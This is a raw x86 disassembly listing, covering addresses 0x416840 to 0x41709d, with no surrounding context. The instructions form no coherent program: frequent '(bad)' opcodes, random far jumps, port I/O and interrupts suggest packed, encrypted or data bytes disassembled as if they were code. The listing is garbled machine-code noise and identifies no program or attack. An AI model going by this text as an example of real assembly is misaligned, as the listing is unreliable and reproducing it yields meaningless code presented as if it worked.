  416840:	(bad)
  416843:	retf   
  416844:	fbld   TBYTE PTR [edi+ebp*8-0x451d0b54]
  41684b:	repz repz repnz dec bl
  416850:	hlt    
  416851:	mov    al,0xee
  416853:	int3   
  416854:	sti    
  416855:	loope  0x41685d
  416857:	in     eax,0xf0
  416859:	test   BYTE PTR [esi+eax*1],0xe0
  41685d:	or     edi,edx
  41685f:	retf   0xee0d
  416862:	loopne 0x416836
  416864:	test   eax,0xb6c0e6c1
  416869:	mov    dl,0xce
  41686b:	cmc    
  41686c:	lods   eax,DWORD PTR ds:[esi]
  41686d:	(bad)  
  41686e:	lds    edi,FWORD PTR [edi-0x27093312]
  416874:	xbegin 0xec364067
  41687a:	add    eax,esp
  41687c:	cmc    
  41687d:	(bad)  
  41687f:	(bad)
  416882:	out    dx,al
  416883:	mov    al,0xbf
  416885:	scas   eax,DWORD PTR es:[edi]
  416886:	mov    dl,0xd2
  416888:	out    0xe9,eax
  41688a:	stc    
  41688b:	(bad)  [edx+edi*8-0x41fc0532]
  416892:	cli    
  416893:	add    esp,ecx
  416895:	add    ebx,eax
  416897:	pop    es
  416898:	ret    0xc2eb
  41689b:	cli    
  41689c:	(bad)  
  41689d:	in     eax,0xee
  41689f:	int    0xfd
  4168a1:	fisubr WORD PTR [ebp-0x1c352833]
  4168a7:	mov    ch,0xc4
  4168a9:	leave  
  4168aa:	shl    esp,1
  4168ac:	(bad)  
  4168ad:	fld    st(4)
  4168af:	cli    
  4168b0:	cli    
  4168b1:	fucomi st,st(5)
  4168b3:	sti    
  4168b4:	out    0xdb,al
  4168b6:	(bad)  
  4168b7:	in     al,dx
  4168b8:	jmp    0xceca:0x6fec5c2
  4168bf:	retf   
  4168c0:	in     al,0x8
  4168c2:	rol    edi,0xcc
  4168c5:	sar    DWORD PTR [eax+ebp*8-0x9272517],cl
  4168cc:	clc    
  4168cd:	(bad)  
  4168ce:	jmp    0xbd3a329f
  4168d3:	into   
  4168d4:	ret    
  4168d5:	clc    
  4168d6:	mov    ebp,0xd5e0d3f2
  4168db:	cld    
  4168dc:	(bad)  
  4168dd:	rol    BYTE PTR ds:0xacf3d3fe,0xeb
  4168e4:	fmulp  st(7),st
  4168e6:	ret    
  4168e7:	enter  0xecea,0xcd
  4168eb:	scas   al,BYTE PTR es:[edi]
  4168ec:	in     eax,0xd8
  4168ee:	retf   
  4168ef:	fnstcw WORD PTR [edx+0x6dae8b0]
  4168f5:	icebp  
  4168f6:	lock rol DWORD PTR [ecx+ebx*8],1
  4168fa:	clc    
  4168fb:	test   cl,0xe8
  4168fe:	push   es
  4168ff:	fld    DWORD PTR [esi]
  416901:	adc    bh,BYTE PTR [eax-0x1d350e29]
  416907:	shr    ah,cl
  416909:	mov    bl,0xe9
  41690b:	fcomi  st,st(2)
  41690d:	aam    0xff
  41690f:	xlat   BYTE PTR ds:[ebx]
  416910:	jmp    0xc11520e9
  416915:	loop   0x4168f4
  416917:	or     ebx,esi
  416919:	jecxz  0x416903
  41691b:	lock out dx,eax
  41691d:	add    ecx,ebp
  41691f:	ret    0xd8ec
  416922:	lods   al,BYTE PTR ds:[esi]
  416923:	int    0xb0
  416925:	imul   DWORD PTR [ebp-0x1a2b0d2b]
  41692b:	icebp  
  41692c:	shl    BYTE PTR [edx+ecx*8-0xe072a43],cl
  416933:	xlat   BYTE PTR ds:[ebx]
  416934:	(bad)  
  416936:	add    al,0xd2
  416938:	fld    DWORD PTR [esp+edi*8]
  41693b:	or     dh,bh
  41693d:	loopne 0x416925
  41693f:	or     al,0xe6
  416941:	(bad)  
  416943:	(bad)  
  416944:	jmp    0xe9ce:0xf6d2eac5
  41694b:	vpmaxsw ymm2,ymm3,ymm5
  41694f:	mov    edi,0xd3e9f7dc
  416954:	shl    bl,0xd5
  416957:	add    esp,esi
  416959:	cli    
  41695a:	shl    bh,1
  41695c:	jmp    0x9157457
  416961:	push   es
  416962:	rcl    ecx,1
  416964:	mov    bl,0xcd
  416966:	retf   0xefd4
  416969:	(bad)
  41696c:	jmp    0x41694c
  41696e:	into   
  41696f:	mov    esi,0xccf5d8d4
  416974:	out    0xf3,eax
  416976:	stc    
  416977:	add    cl,BYTE PTR [edx]
  416979:	add    bh,ch
  41697b:	aam    0x2
  41697d:	mov    esp,0x4faefef
  416982:	lock mov dl,0xe3
  416985:	out    dx,al
  416986:	iret   
  416987:	out    dx,eax
  416988:	int3   
  416989:	in     al,dx
  41698a:	shr    al,cl
  41698c:	mov    ah,0xc4
  41698e:	mov    bh,0xee
  416990:	(bad)  
  416991:	mov    ebp,0xdfdcdfbc
  416996:	neg    esi
  416998:	jmp    0xea09:0xf9d7cb02
  41699f:	fild   WORD PTR [eax]
  4169a1:	fdivr  DWORD PTR [edi-0x150a1b1a]
  4169a7:	icebp  
  4169a8:	int3   
  4169a9:	mov    cl,0xef
  4169ab:	repz sti 
  4169ad:	mov    esi,0xfcb9bfd0
  4169b2:	fcmovbe st,st(7)
  4169b4:	in     al,dx
  4169b5:	add    ebx,esp
  4169b7:	stc    
  4169b8:	repz ret 0xf8c3
  4169bc:	pop    es
  4169bd:	retf   
  4169be:	out    0xc6,al
  4169c0:	cld    
  4169c1:	cld    
  4169c2:	icebp  
  4169c3:	shl    ebp,0xc9
  4169c6:	hlt    
  4169c7:	repnz lods al,BYTE PTR ds:[esi]
  4169c9:	in     eax,0xe5
  4169cb:	mov    al,0xea
  4169cd:	xlat   BYTE PTR ds:[ebx]
  4169ce:	mov    esi,0xeeb0f4b2
  4169d3:	hlt    
  4169d4:	jecxz  0x4169a4
  4169d6:	mov    esi,0xf4bcd2fb
  4169db:	fiadd  DWORD PTR [eax+ebx*8]
  4169de:	(bad)  
  4169df:	call   0xe73469cb
  4169e4:	in     al,dx
  4169e5:	out    0xe6,eax
  4169e7:	loop   0x4169d4
  4169e9:	mov    edx,0xcdb0f8b5
  4169ee:	fmulp  st(5),st
  4169f0:	jmp    0x4169cd
  4169f2:	add    al,cl
  4169f4:	cli    
  4169f5:	repnz cli 
  4169f7:	fdivrp st(0),st
  4169f9:	fucomp st(2)
  4169fb:	retf   0x2c6
  4169fe:	out    dx,eax
  4169ff:	or     al,0xc8
  416a01:	shl    ah,cl
  416a03:	in     al,dx
  416a04:	in     eax,0xd2
  416a06:	int    0xd0
  416a08:	xlat   BYTE PTR ds:[ebx]
  416a09:	in     eax,dx
  416a0a:	in     al,0xb0
  416a0c:	in     al,dx
  416a0d:	lds    esi,FWORD PTR [ebp-0xe223336]
  416a13:	out    dx,eax
  416a14:	fptan  
  416a16:	clc    
  416a17:	(bad)  
  416a19:	aad    0xc9
  416a1b:	out    0xca,eax
  416a1d:	(bad)  
  416a1e:	fmul   st,st(4)
  416a20:	leave  
  416a21:	or     eax,ebx
  416a23:	loopne 0x416a11
  416a25:	jmp    0xd4e8:0xacb3d4e1
  416a2c:	(bad)  
  416a2e:	mov    bh,0xb2
  416a30:	mov    ebp,0xddeefaff
  416a35:	mov    esi,0xf2f9d006
  416a3a:	cli    
  416a3b:	enter  0xdd02,0x9
  416a3f:	iret   
  416a40:	or     al,0x3
  416a42:	mov    bl,0xaf
  416a45:	jecxz  0x416a39
  416a47:	lods   eax,DWORD PTR ds:[esi]
  416a48:	jmp    0xd4125043
  416a4d:	std    
  416a4e:	div    bl
  416a50:	call   0xbf453f54
  416a55:	rol    ebp,0xc7
  416a58:	ror    BYTE PTR [edx],0x2
  416a5b:	add    bl,bh
  416a5d:	(bad)  
  416a5f:	jecxz  0x416a68
  416a61:	enter  0xc4e9,0xe6
  416a65:	shr    ebx,cl
  416a67:	mov    ch,0xc0
  416a69:	(bad)  
  416a6a:	cmc    
  416a6b:	sti    
  416a6c:	mov    eax,0xebc4d7ea
  416a71:	mov    edi,0xf5d3bd00
  416a76:	cli    
  416a77:	in     al,dx
  416a78:	repnz aad 0xd0
  416a7b:	jecxz  0x416a48
  416a7d:	aam    0xc9
  416a7f:	leave  
  416a80:	call   0xdd153a6b
  416a85:	out    0xb5,eax
  416a87:	loop   0x416a32
  416a89:	jmp    0x416a66
  416a8b:	lock in al,dx
  416a8d:	(bad)  
  416a8e:	shl    ah,cl
  416a90:	(bad)  
  416a91:	cli    
  416a92:	(bad)  
  416a93:	mov    ebp,0xf1db00f7
  416a98:	repz add bh,bl
  416a9b:	add    al,0xe6
  416a9d:	test   BYTE PTR [esi],0xdb
  416aa0:	fld    DWORD PTR [edi]
  416aa2:	icebp  
  416aa3:	in     eax,dx
  416aa4:	scas   eax,DWORD PTR es:[edi]
  416aa5:	mov    esp,0xeae9d7e6
  416aaa:	in     al,0xf9
  416aac:	mov    bh,0xba
  416aae:	mov    edx,0xdbfad4c9
  416ab3:	into   
  416ab4:	in     eax,dx
  416ab5:	jecxz  0x416aa4
  416ab7:	rcl    bh,1
  416ab9:	rol    cl,1
  416abb:	or     DWORD PTR [edx],ecx
  416abd:	(bad)  
  416abe:	or     esp,edx
  416ac0:	in     al,dx
  416ac1:	in     al,dx
  416ac2:	mov    ebp,0xc1d2ebe7
  416ac7:	out    dx,al
  416ac8:	mov    ebx,0xf8efc5e2
  416acd:	repz imul dl
  416ad0:	fstp   TBYTE PTR [esi+edx*8-0x182efd41]
  416ad7:	(bad)  
  416ad9:	faddp  st(5),st
  416adb:	imul   bl
  416add:	(bad)  
  416ade:	fdiv   st(4),st
  416ae0:	(bad)  
  416ae1:	repnz repnz rol ch,1
  416ae5:	lock mov dl,0xcb
  416ae8:	shl    dl,0xfa
  416aeb:	jmp    ebp
  416aed:	int    0xe9
  416aef:	shl    BYTE PTR [ecx-0xc29040b],1
  416af5:	mov    ebp,0x7d1dce2
  416afa:	add    ch,bh
  416afc:	dec    BYTE PTR [esi]
  416afe:	cli    
  416aff:	(bad)
  416b02:	retf   0xeede
  416b05:	in     eax,dx
  416b06:	xlat   BYTE PTR ds:[ebx]
  416b07:	(bad)  
  416b08:	in     al,dx
  416b09:	lock mov edx,0xf5dbd6f5
  416b0f:	enter  0xf7ff,0xde
  416b13:	clc    
  416b14:	loopne 0x416b11
  416b16:	mov    esi,0x7f4d9d1
  416b1b:	lock add edi,ecx
  416b1e:	add    ecx,ebp
  416b20:	call   0xae213c12
  416b25:	jmp    0xdfcf:0xf1d3d7c8
  416b2c:	fcomp  st(6)
  416b2e:	out    dx,al
  416b2f:	rcl    ebp,1
  416b31:	mov    edi,0xc0d7fecc
  416b36:	ffreep st(6)
  416b38:	aad    0xe1
  416b3a:	loopne 0x416b10
  416b3c:	sti    
  416b3d:	mov    esp,0xe4cfc8de
  416b42:	int    0xe2
  416b44:	jmp    0xc2ec550b
  416b49:	loop   0x416b19
  416b4b:	scas   al,BYTE PTR es:[edi]
  416b4c:	(bad)  [edi-0x2c2f1618]
  416b52:	cli    
  416b53:	neg    esp
  416b55:	rcr    al,0xdc
  416b58:	add    eax,DWORD PTR [ecx]
  416b5a:	xbegin 0xe20a3169
  416b60:	enter  0xb8cf,0xf2
  416b64:	in     al,dx
  416b65:	lock mov ebp,0xcbfaacaa
  416b6b:	shl    ebp,cl
  416b6d:	rcl    al,1
  416b6f:	jmp    0xbe2a6661
  416b74:	shl    ah,1
  416b76:	mov    ebx,0xf0d5f2f5
  416b7b:	pop    es
  416b7c:	loope  0x416b45
  416b7e:	(bad)
  416b81:	int    0xc1
  416b83:	ffreep st(2)
  416b85:	mov    al,0xb3
  416b87:	in     al,0xd5
  416b89:	fld    st(1)
  416b8b:	lock repz in al,dx
  416b8e:	jmp    0x416b84
  416b90:	mov    esp,0xfaffe9e2
  416b95:	(bad)  
  416b96:	shl    dl,1
  416b98:	add    ebx,ebp
  416b9a:	jmp    0xed077b9b
  416b9f:	or     eax,0xc6cfe2d3
  416ba4:	(bad)  
  416ba6:	hlt    
  416ba7:	ret    
  416ba8:	(bad)  
  416ba9:	mov    ebx,0xdbb6f6da
  416bae:	fcomi  st,st(3)
  416bb0:	clc    
  416bb1:	(bad)  
  416bb2:	mov    esi,0xd9fbf1f5
  416bb7:	(bad)  
  416bb9:	cli    
  416bba:	fprem  
  416bbc:	(bad)  
  416bbd:	mov    esp,0xedc8e3f5
  416bc2:	lock test eax,0xcdc7cfae
  416bc8:	jmp    0x416ba1
  416bca:	into   
  416bcb:	retf   0xb0e7
  416bce:	(bad)  
  416bcf:	jmp    0xf401:0xc2dbbfee
  416bd6:	out    0xd7,al
  416bd8:	fadd   st(6),st
  416bda:	or     eax,ecx
  416bdc:	(bad)
  416bdf:	jecxz  0x416bee
  416be1:	fxch   st(5)
  416be3:	rcr    ebp,cl
  416be5:	out    dx,eax
  416be6:	mov    bl,0xb1
  416be8:	mul    esp
  416bea:	mov    ecx,0xf8d6c9e9
  416bef:	mov    ch,0xef
  416bf1:	jecxz  0x416bed
  416bf3:	loope  0x416bee
  416bf5:	ffree  st(0)
  416bf7:	ret    
  416bf8:	cld    
  416bf9:	(bad)  
  416bfa:	jecxz  0x416bf7
  416bfc:	or     al,BYTE PTR ds:0xe9fe04e7
  416c02:	repnz out 0xe8,eax
  416c05:	idiv   DWORD PTR [eax+eiz*8-0x437264e]
  416c0c:	repnz sti 
  416c0e:	fcmovnbe st,st(4)
  416c10:	int    0xd6
  416c12:	int    0xc0
  416c14:	mov    ch,0xf0
  416c16:	in     al,dx
  416c17:	push   es
  416c18:	(bad)  
  416c19:	hlt    
  416c1a:	or     ah,cl
  416c1c:	aam    0xe5
  416c1e:	fucomp st(7)
  416c20:	retf   0xbef3
  416c23:	fdivr  QWORD PTR [edi-0x244b501b]
  416c29:	call   0xbb13431e
  416c2e:	leave  
  416c2f:	jmp    0xb725410b
  416c34:	cli    
  416c35:	repz repz xlat BYTE PTR ds:[ebx]
  416c38:	(bad)
  416c3b:	fmul   QWORD PTR [edi]
  416c3d:	fdivr  st,st(2)
  416c3f:	cld    
  416c40:	add    al,0xef
  416c42:	mov    bl,0xbe
  416c44:	loopne 0x416c10
  416c46:	retf   
  416c47:	rcl    dl,0xfa
  416c4a:	(bad)  [edi-0xa142b47]
  416c50:	aad    0xdd
  416c52:	in     eax,dx
  416c53:	clc    
  416c54:	mov    esi,0xd7d5c2db
  416c59:	(bad)  
  416c5b:	jmp    0x2c8:0xda00c6cb
  416c62:	loopne 0x416c50
  416c64:	mov    edi,0xb7d4e3f7
  416c69:	(bad)  
  416c6a:	loope  0x416c4b
  416c6c:	fucomi st,st(0)
  416c6e:	fcomp  st(5)
  416c70:	jmp    0x416c40
  416c72:	sar    DWORD PTR [esi+eiz*8-0x21271b0c],cl
  416c79:	(bad)  
  416c7b:	sti    
  416c7c:	loop   0x416c7a
  416c7e:	add    al,BYTE PTR [ebx+eiz*8]
  416c81:	rol    ecx,cl
  416c83:	out    dx,eax
  416c84:	jmp    0x416c50
  416c86:	loopne 0x416c6c
  416c88:	cmc    
  416c89:	aad    0xef
  416c8b:	clc    
  416c8c:	retf   0xc8ef
  416c8f:	aam    0x3
  416c91:	icebp  
  416c92:	repz mov esi,0xf8f2f5d4
  416c98:	mov    ebp,0xad7e009
  416c9d:	fscale 
  416c9f:	fucom  st(4)
  416ca1:	adc    ebx,esp
  416ca3:	lods   al,BYTE PTR ds:[esi]
  416ca4:	test   eax,0xd7d2f7ad
  416ca9:	out    dx,eax
  416caa:	jmp    0xce355d94
  416caf:	iret   
  416cb0:	repnz int 0xba
  416cb3:	int3   
  416cb4:	rol    bl,cl
  416cb6:	mov    edi,0xbea07f8
  416cbb:	mov    esi,0xcac5eae5
  416cc0:	push   cs
  416cc1:	or     ah,dh
  416cc3:	test   ebp,0xc2c6aed7
  416cc9:	ret    0xc6f6
  416ccc:	idiv   DWORD PTR [ebx-0x4bfd273c]
  416cd2:	in     al,dx
  416cd3:	add    bl,al
  416cd5:	add    edx,ebx
  416cd7:	(bad)
  416cda:	idiv   ch
  416cdc:	dec    ecx
  416cde:	cld    
  416cdf:	clc    
  416ce0:	out    0xed,eax
  416ce2:	(bad)  
  416ce3:	out    0xf3,eax
  416ce5:	retf   
  416ce6:	scas   eax,DWORD PTR es:[edi]
  416ce7:	mov    bl,0xd2
  416ce9:	sar    dl,0xea
  416cec:	fmulp  st(6),st
  416cee:	mov    dh,0xbe
  416cf0:	jmp    0x416cbf
  416cf2:	loopne 0x416cc8
  416cf4:	div    bh
  416cf6:	fdiv   st(4),st
  416cf8:	loop   0x416cf4
  416cfa:	ret    0xfedf
  416cfd:	enter  0xfdc7,0xc5
  416d01:	fmul   st,st(2)
  416d03:	mov    ebp,0xe9e6ccd7
  416d08:	(bad)  
  416d09:	int    0xe4
  416d0b:	mov    dh,0xe6
  416d0d:	mul    ebp
  416d0f:	mov    esi,0xeec3bdbb
  416d14:	mov    ebp,0xd6dbd2e5
  416d19:	fsub   st,st(6)
  416d1b:	retf   0xc5d7
  416d1e:	out    0x8,al
  416d20:	iret   
  416d21:	clc    
  416d22:	jecxz  0x416d0c
  416d24:	int    0xb0
  416d26:	retf   
  416d27:	int    0xe3
  416d29:	call   0xd4145ef6
  416d2e:	out    dx,eax
  416d2f:	into   
  416d30:	icebp  
  416d31:	int3   
  416d32:	loope  0x416d16
  416d34:	icebp  
  416d35:	cmc    
  416d36:	(bad)  
  416d37:	cmc    
  416d38:	add    eax,esp
  416d3a:	(bad)  
  416d3b:	call   0xdb3f703d
  416d40:	les    edx,FWORD PTR [edx]
  416d42:	fsubr  QWORD PTR [esi-0x29365035]
  416d48:	rcl    ch,cl
  416d4a:	loope  0x416d1d
  416d4c:	(bad)  
  416d4e:	fcmovbe st,st(6)
  416d50:	xlat   BYTE PTR ds:[ebx]
  416d51:	out    dx,eax
  416d52:	loope  0x416d26
  416d54:	out    dx,al
  416d55:	ffreep st(3)
  416d57:	add    al,0xb
  416d59:	rol    dh,0xf
  416d5c:	std    
  416d5d:	add    al,ch
  416d5f:	or     eax,0xf7decbe3
  416d64:	ret    0xb3cc
  416d67:	(bad)  
  416d68:	lods   al,BYTE PTR ds:[esi]
  416d69:	mov    dh,0xca
  416d6b:	(bad)  
  416d6c:	retf   
  416d6d:	out    dx,eax
  416d6e:	mov    bl,0xee
  416d70:	add    ch,al
  416d72:	sar    ebx,1
  416d74:	not    edi
  416d76:	add    al,0xdc
  416d78:	std    
  416d79:	loope  0x416d53
  416d7b:	ffreep st(7)
  416d7d:	fadd   DWORD PTR [edx]
  416d7f:	jmp    0xceff708e
  416d84:	lock jmp 0xcbf4:0xf4d4d4e3
  416d8c:	cmc    
  416d8d:	(bad)  
  416d8f:	lock aad 0xbd
  416d92:	leave  
  416d93:	int3   
  416d94:	clc    
  416d95:	loope  0x416d8a
  416d97:	fninit 
  416d99:	fsub   st,st(1)
  416d9b:	loope  0x416d94
  416d9d:	out    dx,eax
  416d9e:	cmc    
  416d9f:	out    dx,eax
  416da0:	sti    
  416da1:	add    ebp,DWORD PTR [ebp-0x13393314]
  416da7:	aam    0xfa
  416da9:	loopne 0x416d9b
  416dab:	jmp    0xd73a27a4
  416db0:	in     al,dx
  416db1:	(bad)  
  416db2:	inc    DWORD PTR [edi]
  416db4:	rol    BYTE PTR [edx],0xf9
  416db7:	mov    esp,0xddfa09c3
  416dbc:	fucomp st(5)
  416dbe:	into   
  416dbf:	in     al,dx
  416dc0:	fld    DWORD PTR [eax]
  416dc2:	lods   eax,DWORD PTR ds:[esi]
  416dc3:	mov    edi,0xcfc8c1c1
  416dc8:	sti    
  416dc9:	out    dx,al
  416dca:	hlt    
  416dcb:	hlt    
  416dcc:	aad    0xb9
  416dce:	repnz out dx,al
  416dd0:	in     eax,dx
  416dd1:	std    
  416dd2:	push   DWORD PTR [esi-0x1c3e273f]
  416dd8:	fimul  WORD PTR [edx]
  416dda:	xbegin 0xe90e7ce0
  416de0:	push   cs
  416de1:	fnstsw WORD PTR [esi-0x2b4c4d42]
  416de7:	enter  0xcdfb,0xc7
  416deb:	sti    
  416dec:	(bad)  
  416dee:	jmp    0xfac8:0xd3dac8e4
  416df5:	mov    ebp,0xe6ebf2f2
  416dfa:	jecxz  0x416dbc
  416dfc:	test   DWORD PTR [esp+ebp*8],0xf1ff0ff4
  416e03:	ret    
  416e04:	repnz loop 0x416dfb
  416e07:	jmp    0xdbe5:0xcbd2f1c3
  416e0e:	out    dx,eax
  416e0f:	jecxz  0x416e00
  416e11:	mov    esi,0x601f2e0
  416e16:	jmp    eax
  416e18:	clc    
  416e19:	fcmovu st,st(6)
  416e1b:	call   0xc8493dea
  416e20:	loope  0x416e1a
  416e22:	in     eax,dx
  416e23:	fucom  st(0)
  416e25:	repz ror cl,0xb0
  416e29:	out    dx,al
  416e2a:	aam    0xba
  416e2c:	int3   
  416e2d:	mov    eax,0xcdbbddd3
  416e32:	int    0xe1
  416e34:	out    dx,eax
  416e35:	icebp  
  416e36:	hlt    
  416e37:	(bad)  
  416e39:	(bad)  
  416e3a:	fcomip st,st(6)
  416e3c:	(bad)  
  416e3d:	jecxz  0x416e37
  416e3f:	aam    0xf9
  416e41:	in     al,dx
  416e42:	repz mov ch,0xe0
  416e46:	out    dx,eax
  416e47:	into   
  416e48:	neg    edx
  416e4a:	mov    dl,0xb1
  416e4c:	retf   
  416e4d:	retf   
  416e4e:	repnz add esi,esp
  416e51:	mov    ebp,0xfbe3d3ba
  416e56:	mov    edi,0xdbe0dce0
  416e5b:	out    0xf,al
  416e5d:	out    0xe7,al
  416e5f:	out    0x8,al
  416e61:	fcmove st,st(6)
  416e63:	fsubr  QWORD PTR [eax-0x1a24111a]
  416e69:	(bad)
  416e6d:	in     al,dx
  416e6e:	(bad)  
  416e6f:	in     eax,dx
  416e70:	fidivr WORD PTR [edi-0x1eff262e]
  416e76:	(bad)  
  416e77:	mov    ebp,0xcae5c4d9
  416e7c:	shl    bl,0xe1
  416e7f:	int    0xf3
  416e81:	add    al,bl
  416e83:	scas   eax,DWORD PTR es:[edi]
  416e84:	leave  
  416e85:	mov    al,0xe3
  416e87:	loop   0x416e36
  416e89:	hlt    
  416e8a:	(bad)
  416e8e:	(bad)  
  416e8f:	cli    
  416e90:	shr    ecx,1
  416e92:	(bad)  
  416e94:	mov    ch,0xfe
  416e96:	aad    0xd6
  416e98:	(bad)  
  416e9a:	ror    DWORD PTR [edx],1
  416e9c:	fcomp  st(4)
  416e9e:	aad    0xf4
  416ea0:	jmp    0x416eab
  416ea2:	test   al,0xea
  416ea4:	lock test al,0xc4
  416ea7:	mov    dh,0xe2
  416ea9:	jmp    0xb4f5:0xdef3f1c7
  416eb0:	fucom  st(2)
  416eb2:	shl    ebp,cl
  416eb4:	shr    esi,cl
  416eb6:	add    esi,edi
  416eb8:	pop    es
  416eb9:	jmp    edx
  416ebb:	hlt    
  416ebc:	loopne 0x416ecc
  416ebe:	dec    dl
  416ec0:	or     ecx,esp
  416ec2:	in     eax,dx
  416ec3:	retf   
  416ec4:	jecxz  0x416eb0
  416ec6:	xlat   BYTE PTR ds:[ebx]
  416ec7:	cmc    
  416ec8:	call   0xd4f728af
  416ecd:	fidivr WORD PTR [edi-0x1145131c]
  416ed3:	mov    dh,0xfa
  416ed5:	sar    esp,0xf0
  416ed8:	std    
  416ed9:	add    cl,cl
  416edb:	xlat   BYTE PTR ds:[ebx]
  416edc:	loop   0x416e9a
  416ede:	ficom  WORD PTR [ebx]
  416ee0:	fmul   DWORD PTR [edi+ecx*8]
  416ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ee4:	out    0xed,eax
  416ee6:	aad    0xd2
  416ee8:	out    0xd7,al
  416eea:	mov    al,0xae
  416eec:	(bad)  
  416eed:	in     al,dx
  416eee:	mov    ebp,0xdee9bbb6
  416ef3:	(bad)  
  416ef5:	add    dl,dl
  416ef7:	rcl    ebx,1
  416ef9:	mov    esp,0xd8dd03f7
  416efe:	clc    
  416eff:	or     ecx,ecx
  416f01:	cld    
  416f02:	loope  0x416ec6
  416f04:	scas   al,BYTE PTR es:[edi]
  416f05:	loope  0x416eea
  416f07:	rcl    bh,1
  416f09:	cli    
  416f0a:	cli    
  416f0b:	mov    edx,0xd3f0cff1
  416f10:	repnz (bad) 
  416f13:	mov    esi,0xe3e4b8ee
  416f18:	cld    
  416f19:	stc    
  416f1a:	fdivr  st,st(5)
  416f1c:	add    al,0xc6
  416f1e:	fsub   st,st(5)
  416f20:	add    ecx,edx
  416f22:	mov    ecx,0xd3f6e0d0
  416f27:	mov    dh,0xc6
  416f29:	mov    bl,0xf1
  416f2b:	clc    
  416f2c:	int    0xc8
  416f2e:	cmc    
  416f2f:	int3   
  416f30:	fdivp  st(2),st
  416f32:	add    eax,eax
  416f34:	(bad)  
  416f36:	add    eax,0xded6f6d5
  416f3b:	fdiv   st(0),st
  416f3d:	loopne 0x416f09
  416f3f:	fld    DWORD PTR [ecx]
  416f41:	fcom   st(1)
  416f43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f44:	mov    al,0xd7
  416f46:	mov    bl,0xe7
  416f48:	mov    dh,0xec
  416f4a:	(bad)  
  416f4c:	clc    
  416f4d:	retf   
  416f4e:	in     eax,dx
  416f4f:	retf   
  416f50:	add    ch,al
  416f52:	std    
  416f53:	shr    esi,0xe5
  416f56:	out    0xfc,eax
  416f58:	repnz icebp 
  416f5a:	rol    BYTE PTR ds:0xc5cfeee0,1
  416f60:	or     al,0xeb
  416f62:	enter  0xdeea,0xd3
  416f66:	loopne 0x416f49
  416f68:	lock out dx,al
  416f6a:	jmp    0x416f23
  416f6c:	(bad)  
  416f6d:	fmul   st,st(3)
  416f6f:	(bad)  
  416f70:	xlat   BYTE PTR ds:[ebx]
  416f71:	(bad)  
  416f72:	sti    
  416f73:	mov    dh,0xd7
  416f75:	shl    ecx,1
  416f77:	(bad)
  416f7a:	idiv   eax
  416f7c:	enter  0xe6e8,0xcf
  416f80:	or     al,BYTE PTR [edi]
  416f82:	ror    ebx,0xd3
  416f85:	(bad)  
  416f87:	mov    ch,0xcb
  416f89:	mov    dh,0xd0
  416f8b:	repz mov bh,0xf5
  416f8e:	in     al,0xcf
  416f90:	shr    bh,cl
  416f92:	xlat   BYTE PTR ds:[ebx]
  416f93:	(bad)  
  416f95:	hlt    
  416f96:	in     al,0xf1
  416f98:	fisttp WORD PTR [ebx]
  416f9a:	jmp    0xce00:0x90dbde2
  416fa1:	jmp    0xd82f2894
  416fa6:	iret   
  416fa7:	int    0xc5
  416fa9:	(bad)  
  416faa:	repz imul eax
  416fad:	sti    
  416fae:	mov    ch,0xbe
  416fb0:	mov    esp,0xbdd40301
  416fb5:	loopne 0x416f83
  416fb7:	fsub   st(3),st
  416fb9:	add    esp,eax
  416fbb:	enter  0xead9,0xf9
  416fbf:	clc    
  416fc0:	out    0xeb,al
  416fc2:	iret   
  416fc3:	int    0xd3
  416fc5:	shr    dh,cl
  416fc7:	icebp  
  416fc8:	not    eax
  416fca:	jmp    0x416f7e
  416fcc:	(bad)  
  416fcd:	(bad)  
  416fce:	clc    
  416fcf:	mov    ebx,0xd9ecc3c9
  416fd4:	(bad)  
  416fd5:	out    dx,al
  416fd6:	fld    DWORD PTR [esi]
  416fd8:	repnz loope 0x416fb2
  416fdb:	aad    0xe7
  416fdd:	(bad)  
  416fde:	cli    
  416fdf:	int3   
  416fe0:	add    eax,DWORD PTR [ebx]
  416fe2:	int3   
  416fe3:	jmp    0xc7c2:0xf7edc7c4
  416fea:	icebp  
  416feb:	out    dx,eax
  416fec:	call   ecx
  416fee:	leave  
  416fef:	mov    esi,0xbee1cebf
  416ff4:	xlat   BYTE PTR ds:[ebx]
  416ff5:	shl    ebp,0xdd
  416ff8:	shl    al,cl
  416ffa:	loopne 0x416ff2
  416ffc:	ror    DWORD PTR [edi],0xdb
  416fff:	retf   0xec0a
  417002:	fidivr WORD PTR [eax-0x1e371c51]
  417008:	repnz icebp 
  41700a:	int3   
  41700b:	loopne 0x416fff
  41700d:	sti    
  41700e:	in     eax,dx
  41700f:	sar    bl,1
  417011:	retf   0xbec8
  417014:	mov    eax,0xfbf8deb4
  417019:	sar    esi,1
  41701b:	(bad)  
  41701c:	iret   
  41701d:	(bad)  
  41701e:	loope  0x417008
  417020:	or     edi,esp
  417022:	(bad)  
  417023:	shl    BYTE PTR [ebp-0x3e0b4351],1
  417029:	into   
  41702a:	loope  0x416ff3
  41702c:	call   0xc9064b22
  417031:	sti    
  417032:	sar    ecx,1
  417034:	in     eax,dx
  417035:	aam    0xd0
  417037:	mov    BYTE PTR [ecx],0x0
  41703a:	jmp    0x416ffa
  41703c:	loope  0x417034
  41703e:	jmp    0xe2cc:0xc20ccbc5
  417045:	retf   0xf5e6
  417048:	out    dx,al
  417049:	mov    ebx,0xd2fab9e4
  41704e:	jmp    0x417027
  417050:	icebp  
  417051:	rcl    ebp,1
  417053:	ror    ch,0xd0
  417056:	jecxz  0x417033
  417058:	icebp  
  417059:	sar    DWORD PTR [edi+0x1dededc],0xea
  417060:	or     al,BYTE PTR [edx]
  417062:	stos   BYTE PTR es:[edi],al
  417063:	lock scas eax,DWORD PTR es:[edi]
  417065:	out    0xe6,eax
  417067:	stos   BYTE PTR es:[edi],al
  417068:	test   eax,0xc8d0d3f6
  41706d:	enter  0xb4dc,0xd5
  417071:	sar    bl,cl
  417073:	fsubp  st(4),st
  417075:	int    0xd0
  417077:	out    0xc5,al
  417079:	add    al,0xe0
  41707b:	fsincos 
  41707d:	(bad)  
  41707f:	(bad)  
  417080:	stc    
  417081:	add    ebp,esi
  417083:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417084:	into   
  417085:	les    esi,FWORD PTR [ebx-0x3e192b2f]
  41708b:	out    dx,al
  41708c:	mov    ebx,0xbef9efe4
  417091:	sar    DWORD PTR [ecx-0x5fe384a],1
  417097:	or     esp,esi
  417099:	bnd jmp 0x417084
  41709c:	push   cs
  41709d:	or     cl,bl
